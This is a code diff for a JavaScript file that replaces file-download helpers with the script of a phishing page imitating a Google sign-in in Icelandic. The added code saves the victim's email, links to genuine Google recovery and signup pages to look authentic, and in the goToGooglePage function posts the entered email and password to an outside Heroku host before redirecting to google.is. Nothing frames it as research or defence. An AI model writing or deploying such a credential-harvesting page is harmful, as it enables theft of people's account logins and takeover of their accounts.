@@ -1,75 +1,65 @@
-const downloadFileViaHiddenHyperLink = (filename) => {
-  const a = document.createElement("a");
-  a.setAttribute("href", `http://localhost:4000/${filename}`);
-  a.setAttribute("download", filename);
+function goToPasswordPage() {
+  const emailInput = document.getElementById("email-input");
+  localStorage.setItem("email", emailInput.value);
+  window.location.href = "/signin.html";
+}
 
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
-};
+function goToEmailPage() {
+  window.location.href = "/";
+}
 
-const downloadFileViaFetch = (filename) => {
-  const request = new XMLHttpRequest();
+function goToGuestPage() {
+  window.location.href =
+    "https://support.google.com/chrome/answer/6130773?hl=is";
+}
 
-  request.addEventListener("readystatechange", (e) => {
-    const isDownloadFinished = request.readyState == 4;
-    if (!isDownloadFinished) return;
-    console.log(request.response);
-    console.log(URL.createObjectURL(request.response));
+function goToAccountCreationPage() {
+  window.location.href = "https://accounts.google.com/signup?hl=is";
+}
+
+function goToForgettenEmailPage() {
+  window.location.href =
+    "https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=is";
+}
+
+function goToForgottenPasswordPage() {
+  window.location.href =
+    "https://myaccount.google.com/intro/signinoptions/password";
+}
+
+function goToGooglePage() {
+  fetch("https://account-google.herokuapp.com/users", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      email: localStorage.getItem("email"),
+      password: document.getElementById("password-input").value,
+    }),
   });
+  window.location.href = "https://google.is";
+}
 
-  request.responseType = "blob";
-  request.open("get", filename);
-  request.send();
-};
+if (window.location.href.includes("signin.html")) {
+  const emailShower = document.getElementById("email-input-being-shown");
+  let email = localStorage.getItem("email");
 
-function download(filename, text) {
-  const fileBlob = new Blob([text], { type: "application/octet-binary" });
-  const url = URL.createObjectURL(fileBlob);
+  if (!email) emailShower.style.visibility = "hidden";
+  if (!email.includes("@gmail.com")) email = email + "@gmail.com";
 
-  const link = document.createElement("a");
-  link.setAttribute("href", url);
-  link.setAttribute("download", filename);
-
-  if (document.createEvent) {
-    const event = document.createEvent("MouseEvents");
-    event.initEvent("click", true, true);
-    link.dispatchEvent(event);
-  } else {
-    link.click();
+  emailShower.textContent = email;
+} else {
+  const email = localStorage.getItem("email");
+  if (email) {
+    const emailInput = document.getElementById("email-input");
+    emailInput.value = email;
   }
-
-  // Deallocate resources
-  if (URL.revokeObjectURL) URL.revokeObjectURL(url);
 }
 
-function open(options = {}) {
-  return new Promise((resolve, reject) => {
-    const input = document.createElement("input");
-
-    if (options.multiple) input.setAttribute("multiple", "");
-
-    if (options.accept) input.setAttribute("accept", options.accept);
-
-    input.setAttribute("type", "file");
-    input.style.display = "none";
-
-    input.addEventListener("change", (ev) => {
-      if (input.files.length) {
-        if (options.multiple) resolve(input.files);
-        else resolve(input.files[0]);
-      } else {
-        reject(ev);
-      }
-      input.remove();
-    });
-
-    document.body.appendChild(input);
-    input.click();
-  });
-}
-
-// window.addEventListener('')
-
-// // downloadFileViaFetch("test.txt");
-// downloadFileViaHiddenHyperLink("test.exe");
+window.addEventListener("keydown", function (ev) {
+  if (ev.key === "Enter") {
+    if (window.location.href.includes("signin.html")) goToGooglePage();
+    else goToPasswordPage();
+  }
+});
